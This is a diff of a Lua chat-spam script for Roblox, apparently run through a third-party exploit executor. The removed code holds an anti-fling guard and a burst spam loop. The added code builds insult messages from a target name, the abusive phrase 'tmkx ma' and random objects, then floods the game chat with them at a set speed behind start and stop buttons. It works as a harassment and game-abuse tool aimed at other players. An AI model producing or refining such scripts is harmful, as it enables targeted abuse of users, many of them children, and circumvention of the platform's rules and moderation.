-    local now = os.clock()
-    local velocity = root.AssemblyLinearVelocity
-    local angular = root.AssemblyAngularVelocity
-    local speed = velocity.Magnitude
-    local spin = angular.Magnitude
-    local distance = safeCFrame and (root.Position - safeCFrame.Position).Magnitude or 0
-
-    local flingDetected = speed > MAX_SPEED or spin > MAX_ANGULAR or distance > MAX_DISTANCE
-
-    if flingDetected then
-        recoveryUntil = now + RECOVERY_TIME
-        root.AssemblyLinearVelocity = Vector3.zero
-        root.AssemblyAngularVelocity = Vector3.zero
-        if safeCFrame then root.CFrame = safeCFrame end
-        humanoid:Move(Vector3.zero, false)
-        pcall(function()
-            humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
-            humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
-            humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics, false)
-            humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
-        end)
-    elseif now < recoveryUntil then
-        root.AssemblyLinearVelocity = Vector3.zero
-        root.AssemblyAngularVelocity = Vector3.zero
-        humanoid:Move(Vector3.zero, false)
-    else
-        safeCFrame = root.CFrame
-    end
-end)
-
--- Character Head Tag (BillboardGui)
-local function updateHeadTag(state)
-    pcall(function()
-        local char = lp.Character
-        if not char then return end
-        local head = char:FindFirstChild("Head")
-        if not head then return end
-        
-        if state then
-            local existing = head:FindFirstChild("YuviSpamTag")
-            if existing then existing:Destroy() end
-            
-            local bg = Instance.new("BillboardGui")
-            bg.Name = "YuviSpamTag"
-            bg.Size = UDim2.new(0, 220, 0, 50)
-            bg.StudsOffset = Vector3.new(0, 2.5, 0)
-            bg.AlwaysOnTop = true
-            bg.Parent = head
-            
-            local txt = Instance.new("TextLabel")
-            txt.Size = UDim2.new(1, 0, 1, 0)
-            txt.BackgroundTransparency = 1
-            txt.Text = "YUVI DEVTA 👑🐍"
-            txt.TextColor3 = Color3.fromRGB(220, 30, 255)
-            txt.TextSize = 14
-            txt.Font = Enum.Font.GothamBold
-            txt.Parent = bg
-        else
-            local existing = head:FindFirstChild("YuviSpamTag")
-            if existing then existing:Destroy() end
-        end
-    end)
-end
-
-sB.MouseButton1Click:Connect(function()
-    getgenv().Enabled = true
-    sB.BackgroundColor3 = Color3.fromRGB(30, 120, 60)
-    stopB.BackgroundColor3 = theme.redBtn
-    updateHeadTag(true)
-end)
-
-stopB.MouseButton1Click:Connect(function()
-    getgenv().Enabled = false
-    sB.BackgroundColor3 = theme.greenBtn
-    stopB.BackgroundColor3 = Color3.fromRGB(120, 30, 30)
-    updateHeadTag(false)
-end)
-
--- Proven Fast Spam Loop
 task.spawn(function()
     while true do
-        if getgenv().Enabled and #ms > 0 then
-            if getgenv().BurstMode then
-                for i = 1, 5 do
-                    local m = ms[cM]
-                    if m and m ~= "" then
-                        local p = string.rep(getgenv().Symbol, getgenv().Count).." "..tostring(getgenv().Target).." > "..m
-                        cN(p)
-                    end
-                    cM = (cM % #ms) + 1
-                    task.wait(0.05)
+        if active then
+            local custom = NameBox.Text
+            if custom ~= "" then
+                local obj = objects[math.random(1, #objects)]
+                local fullText = custom .. " tmkx ma " .. obj
+                chat(buildWall(fullText))
+                
+                if obj == "Clock" then
+                    Status.Text = "● COOLDOWN (CLOCK)..."
+                    task.wait(10)
+                    Status.Text = "● RUNNING"
+                else
+                    task.wait(spamSpeed)
                 end
-                task.wait(tonumber(getgenv().Delay) or 1.2)
-            else
-                local m = ms[cM]
-                if m and m ~= "" then
-                    local p = string.rep(getgenv().Symbol, getgenv().Count).." "..tostring(getgenv().Target).." > "..m
-                    cN(p)
-                end
-                cM = (cM % #ms) + 1
-                task.wait(tonumber(getgenv().Delay) or 1.2)
             end
-        else
-            task.wait(0.1)
         end
+        task.wait(0.1)
     end
 end)
 
-cN("|| YUVI DEVTA  👑🐍🦅 ||")
+--==================================================
+-- UI BUTTONS
+--==================================================
+
+Start.MouseButton1Click:Connect(function()
+    active = true
+    Status.Text = "● RUNNING"
+    Start.BackgroundColor3 = Color3.fromRGB(30, 120, 60)
+    Stop.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
+    chat("|| YUVI DEVTA 👑🐍🦅 || STARTED ✨")
+end)
+
+Stop.MouseButton1Click:Connect(function()
+    active = false
+    Status.Text = "● STOPPED"
+    Start.BackgroundColor3 = Color3.fromRGB(40, 160, 80)
+    Stop.BackgroundColor3 = Color3.fromRGB(120, 30, 30)
+    chat("|| YUVI DEVTA 👑🐍🦅 || STOPPED 🛑")
+end)
+
+chat("|| YUVI DEVTA 👑🐍🦅 || LOADED SUCCESSFULLY")
